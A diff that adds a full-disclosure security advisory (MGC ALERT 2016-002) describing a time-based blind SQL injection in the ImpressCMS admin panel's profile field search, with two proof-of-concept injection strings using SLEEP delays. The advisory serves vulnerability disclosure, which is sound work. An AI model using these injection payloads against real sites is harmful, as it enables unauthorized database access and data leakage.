@@ -1,0 +1,84 @@
+=============================================
+MGC ALERT 2016-002
+- Original release date: April 8, 2016
+- Last revised:  April 21, 2016
+- Discovered by: Manuel García Cárdenas
+- Severity: 7,1/10 (CVSS Base Score)
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Time-based SQL Injection in Admin panel ImpressCMS <= v1.3.9
+
+II. BACKGROUND
+-------------------------
+ImpressCMS is a community developed Content Management System for easily
+building and maintaining a dynamic web site.
+
+III. DESCRIPTION
+-------------------------
+This bug was found using the portal with authentication as administrator.
+To exploit the vulnerability only is needed use the version 1.0 of the HTTP
+protocol to interact with the application.
+
+It is possible to inject SQL code in the variable
+"quicksearch_mod_profile_Field" on the page
+"/modules/profile/admin/field.php".
+
+IV. PROOF OF CONCEPT
+-------------------------
+The following URL's and parameters have been confirmed to all suffer from
+Time Based Blind SQL injection.
+
+quicksearch_mod_profile_Field=aaaa') AND (SELECT * FROM
+(SELECT(SLEEP(1)))IRLV) AND ('DhUh' LIKE
+'DhUh&button_quicksearch_mod_profile_Field=Search&filtersel=default&limitsel=15
+
+quicksearch_mod_profile_Field=aaaa') AND (SELECT * FROM
+(SELECT(SLEEP(5)))IRLV) AND ('DhUh' LIKE
+'DhUh&button_quicksearch_mod_profile_Field=Search&filtersel=default&limitsel=15
+
+V. BUSINESS IMPACT
+-------------------------
+Public defacement, confidential data leakage, and database server
+compromise can result from these attacks. Client systems can also be
+targeted, and complete compromise of these client systems is also possible.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+ImpressCMS <= v1.3.9
+
+VII. SOLUTION
+-------------------------
+Install vendor patch.
+
+VIII. REFERENCES
+-------------------------
+http://www.impresscms.org/
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered and reported
+by Manuel García Cárdenas (advidsec (at) gmail (dot) com).
+
+X. REVISION HISTORY
+-------------------------
+April 8, 2016 1: Initial release
+April 21, 2016 2: Revision to send to lists
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+April 8, 2016 1: Vulnerability acquired by Manuel Garcia Cardenas
+April 8, 2016 2: Send to vendor
+April 15, 2016 3: New contact to vendor with no response
+April 21, 2016 4: Send to the Full-Disclosure lists
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+
+XIII. ABOUT
+-------------------------
+Manuel Garcia Cardenas
+Pentester
